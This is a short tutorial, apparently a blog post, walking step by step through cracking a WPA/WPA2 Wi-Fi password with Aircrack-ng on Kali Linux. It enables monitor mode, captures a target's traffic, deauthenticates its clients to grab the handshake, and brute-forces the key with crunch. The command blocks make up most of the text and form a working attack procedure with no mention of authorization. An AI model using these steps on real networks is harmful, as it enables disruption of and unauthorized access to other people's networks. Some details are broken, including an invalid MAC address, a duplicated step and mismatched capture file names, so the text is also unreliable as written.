## Introduction

Wi-Fi security plays a vital role in safeguarding digital privacy, and it's important for network administrators and cybersecurity enthusiasts to grasp how vulnerabilities can be taken advantage of. This tutorial will guide you through the process of hacking WPA-WPA2-protected Wi-Fi networks for educational purposes, utilizing Aircrack-ng on Kali Linux.

## Tools Required
Network Adapter (e.g., TL-WN722N V2) with monitoring mode support
Kali Linux 
Aircrack-ng
Airodump-ng
Airmon-ng

## Monitoring Mode Setup
# Step 1: Kill Interrupting Services
- Before enabling monitoring mode, identify and kill services that might interrupt the process:
```
sudo airmon-ng check wlan0
sudo airmon-ng check kill
```

# Step 2: Enable Monitoring Mode
- Stop the WLAN interface and enable monitor mode:
```
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

- Verify the mode using:
```
iwconfig
```

# Step 3: Capture BSSID and Monitor Network
- Use airodump-ng to capture BSSID information:
```
airodump-ng wlan0
```

- Select a specific BSSID for monitoring and run:
- Run the command in the background.
```
airodump-ng -c 1 -w Scan_network --bssid EK:KV:2H:J4:A3:38 wlan0
```
# Step 4: Deauthentication Process
- Deauthenticate the target Wi-Fi to capture the 4-way handshake:
- Run the command until you see the 4-way handshake in the background code.
```
sudo aireplay-ng -0 0 -a EK:KV:2H:J4:A3:38 wlan0
```

- Select a specific BSSID for monitoring and run:
- Run the command in the background.
```
airodump-ng -c 1 -w Scan_network --bssid EK:KV:2H:J4:A3:38 wlan0
```

#Final Stage: Password Cracking with Crunch and Aircrack-ng
- Using Crunch for Password Generation
```
sudo crunch 8 8 123456780 | aircrack-ng -w - WifiScan.cap -e Soham
```
